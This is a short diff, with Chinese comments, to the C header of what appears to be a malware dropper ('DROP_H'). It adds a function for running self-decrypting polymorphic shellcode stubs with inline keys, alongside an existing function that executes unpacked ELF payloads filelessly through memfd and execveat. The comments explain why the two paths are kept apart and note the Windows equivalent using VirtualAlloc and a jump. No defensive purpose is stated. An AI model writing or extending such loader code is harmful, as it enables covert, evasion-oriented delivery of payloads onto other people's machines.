@@ -126,4 +126,21 @@ int dp_serve_chunk(const uint8_t *blob, size_t blob_len,
    本函数不返回：成功时进程映像被替换。 */
 int dp_asm_exec(const dp_asm_t *a, const uint8_t *seed, size_t seed_len);
 
+/*
+ * PIC（位置无关机器码）载荷执行 —— 与上面那条是两条并行的路，不可混用。
+ *
+ *   dp_asm_exec      : 载荷是 ELF 容器，需外部 seed 解包，走 memfd+execveat
+ *                      替换进程映像。仅 Linux。
+ *   dp_asm_exec_pic  : 载荷已经是"自解密多态存根 + 密文"，密钥内联在存根里，
+ *                      无需外部 seed，直接映射执行。跨平台（Windows 侧对应
+ *                      VirtualAlloc + 跳转）。
+ *
+ * 之所以不合并成一个按类型分派的函数：两者的失败模式不同却都致命——
+ * 对 ELF 走 PIC 会跳进 ELF 头崩溃，对 PIC 走 mexec 会 execveat 一个非 ELF。
+ * 分开之后，调用方选错会在第一次执行时立刻暴露，而不是潜伏成偶发故障。
+ *
+ * 成功且载荷终结进程时不返回；载荷主动返回则返回 DP_OK 并释放映射。
+ */
+int dp_asm_exec_pic(const dp_asm_t *a);
+
 #endif /* DROP_H */
